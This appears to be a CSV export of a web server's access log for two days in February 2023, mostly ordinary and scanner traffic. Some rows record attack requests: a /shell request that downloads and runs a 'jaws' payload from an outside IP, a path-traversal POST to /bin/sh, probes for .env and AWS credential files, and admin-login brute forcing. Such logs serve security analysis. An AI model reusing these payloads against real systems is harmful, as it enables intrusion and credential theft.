Host,Time Stamp,Method,Endpoint,Protocol,Status Code,Content Size
36.156.28.132,18/Feb/2023:07:52:43,"-""","""-""","""-",400,157.0
36.156.28.132,18/Feb/2023:07:52:44,"-""","""-""","""-",400,157.0
36.156.28.132,18/Feb/2023:07:52:46,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xD5\x1C\x8A\x06T\x00\xFDlY\xE6\xC1\x11{);\xD4\xAD\x1B\xD7<H-D\xD4,\x07\x0B\x93<\xEDAD","&\x06\xDD\xBA\xF7\xDD\xBClS\xCA*\xBCb&'\xBC\xC2QG\xF4\xBE\x11$iHR\x01\xEFS}}\x9E\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,400,157.0
36.156.28.132,18/Feb/2023:07:52:49,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xC7\xF8\xD5\xAB2\xC0\xDB8\xE7\x9DD\x16\xAB\x13\x89\xED\xBD>\x08\xABX\x1D'\x02\xD5\xF3\xCF\xBB\x9C\xD3b\x8C,"\x1E\xB5\xCC\xD9\xE9\xD8\x01-]*\x92\x94\x91\xBD\x04X\x84Jo\xEB\xD1\xD8\xEEllp\xF2)\xE9Y\xA19\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,400,157.0
36.156.28.132,18/Feb/2023:07:52:50,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x84Y\xD1D\x8EO\xE0\x1E\x07xB`_\xF5A-\xCB\x1F\x9F\xC1\xB5\xB8{,\xC6hj\x90)\x7F\xC3,","\x89\xAD\xE9\x0C?\xDB\x9E\xE0h\xA1g\x01\xE4\x0C\x96\xC78p\x0FH\x8D\xB10\xFB\xA9\x89\x86\x80\xD8\xDCU\x7F\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,400,157.0
36.156.28.132,18/Feb/2023:07:52:51,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03Q\xF7\xD8/8\xF0\xC9\x14a\xA2\x9B\x0CF)\xDESj9\x98\xC2\x1A\x07^\x0E\xA8!\x15e\x12J\xE9\xC7,"\xD0\x0F3nL\xBC\x1C=\x047\xA6V\x85M\x22|XmB(\x86\xECVKBRV;\xD9\xDE\x9Df\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,400,157.0
128.14.141.34,18/Feb/2023:08:19:01,GET,/,HTTP/1.1,301,169.0
193.32.162.159,18/Feb/2023:08:49:25,GET,/,HTTP/1.1,301,169.0
138.197.69.142,18/Feb/2023:09:09:42,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
138.197.69.142,18/Feb/2023:09:09:42,"-""","""-""","""-",400,0.0
194.165.16.71,18/Feb/2023:09:29:38,"\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie:",mstshash=Domain,,400,157.0
194.165.16.71,18/Feb/2023:09:29:39,"\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie:",mstshash=Domain,,400,157.0
45.137.206.132,18/Feb/2023:09:32:37,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
45.137.206.132,18/Feb/2023:09:32:37,"-""","""-""","""-",400,0.0
85.192.189.209,18/Feb/2023:09:39:44,GET,/,HTTP/1.1,400,157.0
107.170.226.25,18/Feb/2023:09:49:49,GET,/druid/index.html,HTTP/1.1,301,169.0
36.156.28.131,18/Feb/2023:09:50:13,GET,/,HTTP/1.0,301,169.0
36.156.28.131,18/Feb/2023:09:50:15,GET,/,HTTP/1.1,301,169.0
36.156.28.131,18/Feb/2023:09:50:19,GET,/favicon.ico,HTTP/1.1,301,169.0
36.156.28.131,18/Feb/2023:09:50:23,GET,/robots.txt,HTTP/1.1,301,169.0
36.156.28.131,18/Feb/2023:09:50:29,GET,/.well-known/security.txt,HTTP/1.1,301,169.0
193.111.250.222,18/Feb/2023:09:51:49,GET,/,HTTP/1.1,301,169.0
195.133.40.16,18/Feb/2023:09:52:50,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
195.133.40.16,18/Feb/2023:09:52:50,"-""","""-""","""-",400,0.0
43.225.169.251,18/Feb/2023:09:55:58,GET,/,HTTP/1.1,301,169.0
198.235.24.159,18/Feb/2023:10:04:09,GET,/,HTTP/1.0,301,169.0
79.137.207.22,18/Feb/2023:10:05:42,GET,http://ip-api.com/json/,HTTP/1.1,301,169.0
79.137.207.22,18/Feb/2023:10:05:43,CONNECT,ip-api.com:443,HTTP/1.1,400,157.0
193.32.162.159,18/Feb/2023:10:10:54,GET,/,HTTP/1.1,301,169.0
143.244.50.172,18/Feb/2023:10:11:36,GET,/config/getuser?index=0,HTTP/1.1,301,169.0
43.154.223.15,18/Feb/2023:10:33:51,GET,/,HTTP/1.1,301,169.0
185.124.117.179,18/Feb/2023:11:06:05,GET,/,HTTP/1.1,301,169.0
87.236.176.83,18/Feb/2023:11:16:59,GET,/,HTTP/1.1,301,169.0
193.32.162.159,18/Feb/2023:11:46:17,GET,/,HTTP/1.1,301,169.0
192.241.201.8,18/Feb/2023:12:00:40,GET,/,HTTP/1.1,301,169.0
212.87.204.100,18/Feb/2023:12:15:25,GET,/,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:12:15:52,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:12:15:52,"-""","""-""","""-",400,0.0
89.208.103.146,18/Feb/2023:12:45:54,GET,http://ip-api.com/json/,HTTP/1.1,301,169.0
89.208.103.146,18/Feb/2023:12:45:54,CONNECT,ip-api.com:443,HTTP/1.1,400,157.0
185.246.220.98,18/Feb/2023:13:00:07,GET,/,HTTP/1.1,301,169.0
202.162.218.107,18/Feb/2023:13:12:47,GET,/,HTTP/1.1,301,169.0
113.142.131.55,18/Feb/2023:13:15:57,GET,/,HTTP/1.1,301,169.0
66.240.205.34,18/Feb/2023:13:39:28,"-""","""-""","""-",400,157.0
92.118.39.82,18/Feb/2023:13:47:02,GET,/,HTTP/1.1,301,169.0
130.43.116.200,18/Feb/2023:14:48:38,GET,/,HTTP/1.1,301,169.0
114.7.149.178,18/Feb/2023:14:53:53,GET,/,HTTP/1.1,301,169.0
114.7.149.178,18/Feb/2023:14:53:53,GET,/manager/html,HTTP/1.1,301,169.0
193.32.162.159,18/Feb/2023:15:09:08,GET,/,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:15:34:11,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:15:34:11,"-""","""-""","""-",400,0.0
94.102.61.10,18/Feb/2023:15:43:10,GET,/,HTTP/1.1,301,169.0
193.32.162.159,18/Feb/2023:15:48:46,GET,/,HTTP/1.1,301,169.0
58.56.206.166,18/Feb/2023:15:55:49,GET,/shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws,HTTP/1.1,301,169.0
220.180.170.188,18/Feb/2023:15:55:49,GET,/shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws,HTTP/1.1,301,169.0
218.23.126.101,18/Feb/2023:15:56:07,GET,/shell?cd+/tmp;rm+-rf+*;wget+94.158.247.123/jaws;sh+/tmp/jaws,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:16:02:42,GET,/,HTTP/1.1,301,169.0
212.87.204.100,18/Feb/2023:16:25:35,GET,/,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:16:34:40,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:16:34:40,"-""","""-""","""-",400,0.0
212.87.204.100,18/Feb/2023:16:37:07,GET,/,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:16:57:48,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:16:57:48,"-""","""-""","""-",400,0.0
143.198.201.142,18/Feb/2023:17:04:32,GET,/,HTTP/1.0,301,169.0
159.203.192.23,18/Feb/2023:17:06:06,"-""","""-""","""-",400,157.0
94.232.47.98,18/Feb/2023:17:14:08,"\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie:",mstshash=Domain,,400,157.0
94.232.47.98,18/Feb/2023:17:14:08,"\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie:",mstshash=Domain,,400,157.0
157.230.249.63,18/Feb/2023:17:17:10,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:17:17:10,"-""","""-""","""-",400,0.0
152.32.132.248,18/Feb/2023:17:50:15,GET,/,HTTP/1.1,301,169.0
167.248.133.63,18/Feb/2023:18:18:59,GET,/,HTTP/1.1,301,169.0
167.248.133.63,18/Feb/2023:18:19:00,PRI,*,HTTP/2.0,400,157.0
79.137.202.2,18/Feb/2023:18:21:33,GET,http://ip-api.com/json/,HTTP/1.1,301,169.0
79.137.202.2,18/Feb/2023:18:21:34,CONNECT,ip-api.com:443,HTTP/1.1,400,157.0
109.237.98.226,18/Feb/2023:18:47:49,GET,/.env,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:50,"\x16\x03\x01\x01H\x01\x00\x01D\x03\x03\xB6o\x12\xFF\x98\x1A\xEF\xE6y&,qN\xABVa5\x9E\x0B\xCD[\xA7\xAD\xEB8n\x074M\xD4\x11\xC5","#X`T\xEC\xAD\xAE2)\xE9\xE6\x16#\x06\x9A]i\x8Fd\xCD'\x08,\xE3)\xDB\xCA\x10\x22P0\x16\x00b\x13\x02\x13\x03\x13\x01\xC0,\xC00\xC0+\xC0/\xCC\xA9\xCC\xA8\x00\xA3\x00\x9F\x00\xA2\x00\x9E\xCC\xAA\xC0\xAF\xC0\xAD\xC0$\xC0(\xC0",,400,157.0
109.237.98.226,18/Feb/2023:18:47:50,POST,/.env,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:50,GET,/.aws/credentials,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:51,POST,/.aws/credentials,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:51,GET,/.aws/config,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:52,POST,/.aws/config,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:52,GET,/aws/credentials,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:52,POST,/aws/credentials,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:53,GET,/credentials,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:53,POST,/credentials,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:54,GET,/test.php,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:54,POST,/test.php,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:55,GET,/laravel/.env,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:55,POST,/laravel/.env,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:55,GET,/demo/.env,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:56,POST,/demo/.env,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:56,GET,/web/.env,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:57,POST,/web/.env,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:57,GET,/phpinfo,HTTP/1.1,301,169.0
109.237.98.226,18/Feb/2023:18:47:58,POST,/phpinfo,HTTP/1.1,301,169.0
45.79.181.251,18/Feb/2023:19:08:41,\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03pn\xEE\xD6o\xCDP\x19\xEBM\x1F\xD5\x18\xF71?\xCE{)\xDD|\xC1\x92`\x9A\x95V\x11\xB4x\x06\x8D\x00\x00,"\xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0",,400,157.0
193.32.162.159,18/Feb/2023:19:20:12,GET,/,HTTP/1.1,301,169.0
152.89.196.211,18/Feb/2023:19:32:34,GET,/?XDEBUG_SESSION_START=phpstorm,HTTP/1.1,301,169.0
65.157.23.94,18/Feb/2023:20:14:04,GET,/.env,HTTP/1.1,301,169.0
65.157.23.94,18/Feb/2023:20:14:04,POST,/,HTTP/1.1,301,169.0
139.28.235.171,18/Feb/2023:20:24:16,GET,/,HTTP/1.1,301,169.0
206.189.130.95,18/Feb/2023:20:43:37,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x8A.\xE4#\xEB\xF1\xAE\xA3\xB2\x83\x96,\xED+)\xBEa\xCC\xFBw'b\xD2\x82\x15z",S\x0E\xB3E\xCA\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0,,400,157.0
206.189.130.95,18/Feb/2023:20:43:37,"-""","""-""","""-",400,157.0
206.189.130.95,18/Feb/2023:20:43:37,GET,/,HTTP/1.1,301,169.0
206.189.130.95,18/Feb/2023:20:43:38,GET,/client/get_targets,HTTP/1.1,301,169.0
193.32.162.159,18/Feb/2023:20:49:28,GET,/,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:20:51:35,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:20:51:35,"-""","""-""","""-",400,0.0
152.89.196.211,18/Feb/2023:21:05:49,GET,/actuator/gateway/routes,HTTP/1.1,301,169.0
193.32.162.159,18/Feb/2023:21:11:36,GET,/,HTTP/1.1,301,169.0
176.58.124.134,18/Feb/2023:21:13:33,GET,/,HTTP/1.1,400,157.0
193.32.162.159,18/Feb/2023:21:23:57,GET,/,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:22:21:34,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
157.230.249.63,18/Feb/2023:22:21:34,"-""","""-""","""-",400,0.0
94.102.61.10,18/Feb/2023:22:31:07,GET,/assets/img/apple-touch-icon.png,HTTP/1.1,301,169.0
94.102.61.10,18/Feb/2023:22:31:08,GET,/assets/img/favicon.png,HTTP/1.1,301,169.0
94.102.61.10,18/Feb/2023:22:31:09,GET,/,HTTP/1.1,301,169.0
94.102.61.10,18/Feb/2023:22:43:51,GET,/assets/img/apple-touch-icon.png,HTTP/1.1,301,169.0
94.102.61.10,18/Feb/2023:22:43:52,GET,/assets/img/favicon.png,HTTP/1.1,301,169.0
94.102.61.10,18/Feb/2023:22:43:53,GET,/,HTTP/1.1,301,169.0
93.184.159.18,18/Feb/2023:22:49:55,GET,/,HTTP/1.0,301,169.0
194.165.16.73,18/Feb/2023:22:51:01,"\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie:",mstshash=Domain,,400,157.0
194.165.16.73,18/Feb/2023:22:51:01,"\x03\x00\x00,'\xE0\x00\x00\x00\x00\x00Cookie:",mstshash=Domain,,400,157.0
193.32.162.159,18/Feb/2023:23:10:25,GET,/,HTTP/1.1,301,169.0
221.11.5.26,19/Feb/2023:00:32:14,GET,/phpmyadmin/index.php,HTTP/1.1,301,169.0
221.11.5.26,19/Feb/2023:00:32:16,GET,/pmd/index.php,HTTP/1.1,301,169.0
59.99.135.56,19/Feb/2023:00:37:32,GET,/boaform/admin/formLogin?username=admin&psd=admin,HTTP/1.0,301,169.0
183.136.225.32,19/Feb/2023:00:58:26,GET,/,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:04:38,GET,/assets/img/favicon.png,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:04:41,GET,/robots.txt,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:04:48,GET,/js/jquery.js,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:04:52,GET,/js/multipage.js,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:05:01,GET,/assets/vendor/jquery/jquery.min.js,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:05:05,GET,/assets/vendor/bootstrap/js/bootstrap.bundle.min.js,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:05:07,GET,/assets/vendor/jquery.easing/jquery.easing.min.js,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:05:08,GET,/assets/vendor/php-email-form/validate.js,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:05:11,GET,/assets/vendor/waypoints/jquery.waypoints.min.js,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:05:15,GET,/assets/vendor/counterup/counterup.min.js,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:05:16,GET,/assets/vendor/venobox/venobox.min.js,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:05:18,GET,/assets/vendor/owl.carousel/owl.carousel.min.js,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:05:19,GET,/assets/vendor/isotope-layout/isotope.pkgd.min.js,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:05:20,GET,/assets/vendor/aos/aos.js,HTTP/1.1,301,169.0
183.136.225.32,19/Feb/2023:01:05:22,GET,/assets/js/main.js,HTTP/1.1,301,169.0
185.246.220.98,19/Feb/2023:01:15:19,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
185.246.220.98,19/Feb/2023:01:15:19,"-""","""-""","""-",400,0.0
118.123.105.86,19/Feb/2023:01:16:10,"-""","""-""","""-",400,157.0
118.123.105.86,19/Feb/2023:01:16:10,\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x8F\xA8t\xA4e\x998\xAEi\x95\xCB/\xCE\x8E\xC6t%\xECa\xA4\xE6\xF4\x1CKc\xC9/\xA24\xD1x\x0C,"]{u\xA6\x93\x06\xBD\xDD\xFDx\xA6>\xB0\x9D\xA0i\xE51q\x81\xF2\xB7\xEF<\x1B\xEC\x9A\xF4\xA7\xEA\xF9Z\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0",,400,157.0
118.123.105.86,19/Feb/2023:01:16:11,GET,/,HTTP/1.1,301,169.0
118.123.105.86,19/Feb/2023:01:16:11,GET,/,HTTP/1.1,301,169.0
37.44.238.197,19/Feb/2023:01:20:58,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.197,19/Feb/2023:01:20:58,"-""","""-""","""-",400,0.0
185.246.220.98,19/Feb/2023:01:27:55,GET,/,HTTP/1.1,301,169.0
37.44.238.199,19/Feb/2023:01:30:15,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.199,19/Feb/2023:01:30:15,"-""","""-""","""-",400,0.0
89.185.85.252,19/Feb/2023:01:39:43,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
89.185.85.252,19/Feb/2023:01:39:43,"-""","""-""","""-",400,0.0
195.37.190.89,19/Feb/2023:02:01:45,GET,/printer/objects/list,HTTP/1.1,301,169.0
193.32.162.159,19/Feb/2023:02:07:45,GET,/,HTTP/1.1,301,169.0
142.4.218.114,19/Feb/2023:02:16:10,GET,/,HTTP/1.1,301,169.0
37.44.238.197,19/Feb/2023:02:19:29,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.197,19/Feb/2023:02:19:29,"-""","""-""","""-",400,0.0
167.71.233.45,19/Feb/2023:02:23:34,"-""","""-""","""-",400,157.0
167.71.233.45,19/Feb/2023:02:23:34,"-""","""-""","""-",400,157.0
167.71.233.45,19/Feb/2023:02:23:34,GET,/,HTTP/1.1,301,169.0
167.71.233.45,19/Feb/2023:02:23:34,GET,/client/get_targets,HTTP/1.1,301,169.0
37.44.238.199,19/Feb/2023:02:26:44,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.199,19/Feb/2023:02:26:44,"-""","""-""","""-",400,0.0
89.185.85.252,19/Feb/2023:02:30:57,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
89.185.85.252,19/Feb/2023:02:30:57,"-""","""-""","""-",400,0.0
37.44.238.231,19/Feb/2023:02:32:50,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.231,19/Feb/2023:02:32:50,"-""","""-""","""-",400,0.0
188.165.87.100,19/Feb/2023:03:01:20,GET,/favicon.ico,HTTP/1.1,301,169.0
178.32.197.92,19/Feb/2023:03:04:15,GET,/,HTTP/1.1,301,169.0
35.195.93.98,19/Feb/2023:03:16:33,GET,/,HTTP/1.1,301,169.0
109.237.97.180,17/Feb/2023:03:56:52,GET,/.env,HTTP/1.1,400,650.0
109.237.97.180,17/Feb/2023:03:56:53,GET,/.env,HTTP/1.1,404,548.0
180.149.125.166,17/Feb/2023:04:02:24,GET,/c/,HTTP/1.1,404,548.0
89.248.165.249,17/Feb/2023:05:30:20,\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie:,mstshash=Administr,,400,150.0
143.244.50.172,17/Feb/2023:06:00:10,GET,/config/getuser?index=0,HTTP/1.1,400,248.0
52.167.144.90,17/Feb/2023:06:21:40,GET,/,HTTP/1.1,200,5952.0
198.235.24.48,17/Feb/2023:06:46:07,GET,/,HTTP/1.1,200,5952.0
134.209.184.61,17/Feb/2023:07:00:38,GET,/,HTTP/1.1,200,5952.0
87.236.176.153,17/Feb/2023:07:52:41,GET,/,HTTP/1.1,200,5952.0
87.236.176.91,17/Feb/2023:07:52:43,GET,/assets/img/favicon.png,HTTP/1.1,200,491.0
87.236.176.18,17/Feb/2023:07:52:43,GET,/assets/img/apple-touch-icon.png,HTTP/1.1,200,1738.0
52.167.144.57,17/Feb/2023:08:22:35,GET,/robots.txt,HTTP/1.1,404,548.0
198.235.24.184,17/Feb/2023:08:31:48,GET,/,HTTP/1.1,200,5952.0
128.14.133.58,17/Feb/2023:08:51:03,GET,/,HTTP/1.1,200,5952.0
118.123.105.86,17/Feb/2023:09:17:13,GET,/,HTTP/1.1,200,5952.0
87.250.224.68,17/Feb/2023:09:38:04,GET,/robots.txt,HTTP/1.1,404,146.0
87.250.224.15,17/Feb/2023:09:38:11,GET,/robots.txt,HTTP/1.1,404,146.0
213.180.203.76,17/Feb/2023:09:38:15,GET,/,HTTP/1.1,200,5952.0
5.255.253.188,17/Feb/2023:09:40:09,GET,/,HTTP/1.1,200,5952.0
103.43.19.20,17/Feb/2023:09:41:33,GET,/,HTTP/1.1,200,5952.0
142.93.138.30,17/Feb/2023:09:48:18,"-""","""-",,400,150.0
142.93.138.30,17/Feb/2023:09:48:19,GET,/ab2g,HTTP/1.1,404,146.0
142.93.138.30,17/Feb/2023:09:48:23,GET,/,HTTP/1.1,200,5952.0
142.93.138.30,17/Feb/2023:09:48:23,GET,/,HTTP/1.1,400,650.0
142.93.138.30,17/Feb/2023:09:48:24,GET,/private/api/v1/service/premaster,HTTP/1.1,400,650.0
142.93.138.30,17/Feb/2023:09:48:24,GET,/t4,HTTP/1.1,404,146.0
20.169.81.108,17/Feb/2023:10:16:30,GET,/webclient/,HTTP/1.1,404,146.0
157.45.211.161,17/Feb/2023:10:19:40,GET,/documentation.html,HTTP/1.1,200,548.0
157.45.211.161,17/Feb/2023:10:19:41,GET,/favicon.ico,HTTP/1.1,404,548.0
157.45.211.161,17/Feb/2023:10:19:41,GET,/swagger-api-spec.yaml,HTTP/1.1,200,62298.0
167.248.133.117,17/Feb/2023:10:21:23,GET,/,HTTP/1.1,200,5952.0
167.248.133.117,17/Feb/2023:10:21:24,PRI,*,HTTP/2.0,400,150.0
167.248.133.117,17/Feb/2023:10:21:25,GET,/assets/img/favicon.png,HTTP/1.1,200,491.0
167.248.133.117,17/Feb/2023:10:21:26,GET,/assets/img/apple-touch-icon.png,HTTP/1.1,200,1738.0
167.248.133.117,17/Feb/2023:10:21:27,GET,/favicon.ico,HTTP/1.1,404,146.0
143.244.50.172,17/Feb/2023:10:25:43,GET,/config/getuser?index=0,HTTP/1.1,400,248.0
143.42.102.52,17/Feb/2023:10:59:22,GET,/,HTTP/1.1,200,5952.0
193.118.55.162,17/Feb/2023:11:05:11,GET,/,HTTP/1.1,200,5952.0
103.43.19.36,17/Feb/2023:11:08:59,GET,/,HTTP/1.1,200,5952.0
128.14.134.134,17/Feb/2023:11:17:24,GET,/,HTTP/1.1,200,5952.0
185.189.182.234,17/Feb/2023:11:18:52,GET,/,HTTP/1.1,400,150.0
23.251.102.82,17/Feb/2023:11:41:39,GET,/,HTTP/1.1,200,5952.0
185.225.74.55,17/Feb/2023:11:46:54,POST,/cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh,HTTP/1.1,400,150.0
143.42.102.54,17/Feb/2023:12:07:25,GET,/,HTTP/1.1,200,5952.0
157.45.211.108,17/Feb/2023:12:24:46,GET,/documentation.html,HTTP/1.1,200,548.0
157.45.211.108,17/Feb/2023:12:24:46,GET,/swagger-api-spec.yaml,HTTP/1.1,200,62298.0
157.45.211.108,17/Feb/2023:12:27:34,GET,/documentation.html,HTTP/1.1,200,548.0
157.45.211.108,17/Feb/2023:12:27:35,GET,/swagger-api-spec.yaml,HTTP/1.1,200,62298.0
157.45.211.108,17/Feb/2023:12:27:40,GET,/documentation.html,HTTP/1.1,200,548.0
157.45.211.108,17/Feb/2023:12:27:43,GET,/swagger-api-spec.yaml,HTTP/1.1,200,62298.0
142.93.138.30,17/Feb/2023:12:40:22,GET,/,HTTP/1.1,200,5952.0
192.241.206.100,17/Feb/2023:12:48:04,GET,/,HTTP/1.1,200,5952.0
117.33.227.207,17/Feb/2023:13:06:29,GET,/,HTTP/1.1,200,5952.0
104.131.128.22,17/Feb/2023:13:18:25,GET,/,HTTP/1.1,400,248.0
143.42.102.195,17/Feb/2023:13:21:48,GET,/,HTTP/1.1,200,5952.0
143.42.102.188,17/Feb/2023:13:56:04,GET,/,HTTP/1.1,200,5952.0
152.89.196.211,17/Feb/2023:14:01:19,GET,/?XDEBUG_SESSION_START=phpstorm,HTTP/1.1,200,5952.0
27.71.224.116,17/Feb/2023:14:06:53,"-""","""-",,400,150.0
193.118.53.194,17/Feb/2023:14:14:23,GET,/,HTTP/1.1,200,5952.0
209.141.51.222,17/Feb/2023:14:20:58,GET,/,HTTP/1.1,200,5952.0
209.141.51.222,17/Feb/2023:14:20:59,GET,/favicon.ico,HTTP/1.1,404,548.0
209.141.33.65,17/Feb/2023:14:21:09,GET,/,HTTP/1.1,200,5952.0
209.141.33.65,17/Feb/2023:14:21:10,GET,/favicon.ico,HTTP/1.1,404,548.0
47.251.14.232,17/Feb/2023:14:34:38,GET,/,HTTP/1.1,200,5952.0
47.254.25.10,17/Feb/2023:14:34:39,GET,/Public/home/js/check.js,HTTP/1.1,404,548.0
47.254.16.187,17/Feb/2023:14:34:43,GET,/static/admin/javascript/hetong.js,HTTP/1.1,404,548.0
87.251.64.11,17/Feb/2023:14:52:52,"\x12\x01\x00^\x00\x00\x01\x00\x00\x00$\x00\x06\x01\x00*\x00\x01\x02\x00+\x00\x01\x03\x00,\x00\x04\x04\x000\x00\x01\x05\x001\x00$\x06\x00U\x00\x01\xFF\x04\x07\x0C\xBC\x00\x00\x00\x00\x00\x00\x15\xD0\x00",\x00\x00\x00\x00\x00\x00\x00\xC0\x0C^\xAFC\x02\x00\x00,,400,150.0
162.243.145.20,17/Feb/2023:15:08:48,"-""","""-",,400,150.0
152.89.196.211,17/Feb/2023:15:23:17,GET,/actuator/gateway/routes,HTTP/1.1,404,548.0
